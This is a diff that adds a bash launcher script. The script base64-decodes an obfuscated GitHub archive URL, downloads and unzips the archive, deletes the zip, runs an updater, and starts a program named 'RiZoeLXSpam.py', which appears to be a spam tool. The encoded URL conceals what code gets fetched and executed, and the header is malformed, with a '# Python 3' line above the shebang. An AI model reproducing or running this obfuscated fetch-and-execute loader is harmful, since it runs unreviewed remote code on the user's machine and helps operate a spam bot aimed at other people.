@@ -1,0 +1,26 @@
+# Python 3
+#!/bin/bash
+
+_python_() {
+    python3${pVer%.*} -c "$1"
+}
+
+_zip () {
+    echo "aHR0cHM6Ly9naXRodWIuY29tL2FyY2hhbmdlbG1pY2hhZWwwMS9vay1jaHV0aXlhLS9hcmNoaXZlL01haW4uemlw" | base64 -d
+}
+
+_starter () {
+    local xpath
+    xpath="sex.zip"
+    echo "••• Downloading •••"
+    wget -q $(_zip) -O "$xpath"
+    XPATH=$(zipinfo -1 "$xpath" | grep -v "/.");
+    unzip -qq "$xpath"
+    rm -rf "$xpath"
+    cd $XPATH
+    python3 ../setup/updater.py ../requirements.txt requirements.txt
+    echo "••• STARTING •••"
+    python3 RiZoeLXSpam.py
+}
+
+_starter
